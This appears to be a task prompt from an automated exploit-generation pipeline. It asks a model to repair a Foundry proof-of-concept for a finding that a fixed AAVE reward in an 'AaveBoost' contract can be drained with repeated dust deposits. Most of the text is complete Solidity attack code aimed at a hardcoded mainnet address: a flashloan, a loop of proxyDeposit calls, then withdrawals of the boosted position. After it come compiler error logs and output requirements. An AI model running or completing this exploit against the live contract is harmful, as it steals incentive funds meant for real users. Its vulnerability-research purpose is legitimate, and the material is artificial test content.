You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unrestricted fixed reward can be sybil-drained with dust deposits
- claim: Whenever `AaveBoost` holds at least `REWARD` AAVE, `proxyDeposit` always adds a full `REWARD` subsidy to the deposit while charging the caller only `amount`. Because there is no minimum deposit size, per-user quota, cooldown, or access control, any account can repeatedly submit dust-sized deposits for itself and capture nearly the entire subsidy reserve.
- impact: An attacker can convert the contract's full reward inventory into attacker-owned pool deposits at negligible cost, stealing all incentives intended for real users.
- exploit_paths: ["Fund `AaveBoost` with reward AAVE", "Attacker calls `proxyDeposit(aave, attacker, 1)` repeatedly", "Each call transfers only the dust `amount` from the attacker but deposits `amount + REWARD` for the attacker", "Attacker later withdraws the boosted pool position, repeating until the contract balance drops below `REWARD`"]

Current FlawVerifier.sol:
```solidity
pragma solidity 0.8.4;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveBoostLike {
    function aave() external view returns (address);
    function pool() external view returns (address);
    function REWARD() external view returns (uint128);
    function proxyDeposit(address asset, address recipient, uint128 amount) external;
}

interface IAavePoolLike {
    function withdraw(address asset, address recipient, uint128 amount, bool claim) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address internal constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    uint128 internal constant DUST_AMOUNT = 1;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _entered;

    constructor() {}

    function executeOnOpportunity() external {
        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        address tokenAddr = boost.aave();
        uint128 reward = boost.REWARD();

        _profitToken = tokenAddr;
        _profitAmount = 0;

        // Infeasible on this fork only if the reward is unset or the contract is not pre-funded.
        if (reward == 0) {
            return;
        }

        IERC20Like token = IERC20Like(tokenAddr);
        if (token.balanceOf(TARGET) < reward) {
            return;
        }

        uint256 beforeBalance = token.balanceOf(address(this));

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = token;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = DUST_AMOUNT;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");

        uint256 afterBalance = token.balanceOf(address(this));
        if (afterBalance > beforeBalance) {
            _profitAmount = afterBalance - beforeBalance;
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not-vault");
        require(!_entered, "entered");
        _entered = true;

        IERC20Like token = tokens[0];
        uint256 amount = amounts[0];
        uint256 fee = feeAmounts[0];

        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        IAavePoolLike pool = IAavePoolLike(boost.pool());
        uint128 reward = boost.REWARD();

        token.approve(TARGET, type(uint256).max);

        // Path-strict execution:
        // 1) rely on AaveBoost already holding reward AAVE,
        // 2) repeatedly call proxyDeposit(aave, attacker, 1),
        // 3) each call only transfers dust from the attacker but deposits dust + REWARD,
        // 4) withdraw the boosted pool position to the attacker,
        // 5) repeat until AaveBoost balance drops below REWARD.
        while (token.balanceOf(TARGET) >= reward) {
            boost.proxyDeposit(address(token), address(this), DUST_AMOUNT);
            pool.withdraw(address(token), address(this), uint128(uint256(reward) + uint256(DUST_AMOUNT)), false);
        }

        token.transfer(BALANCER_VAULT, amount + fee);
        _entered = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
Error: Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.4
Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.4

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
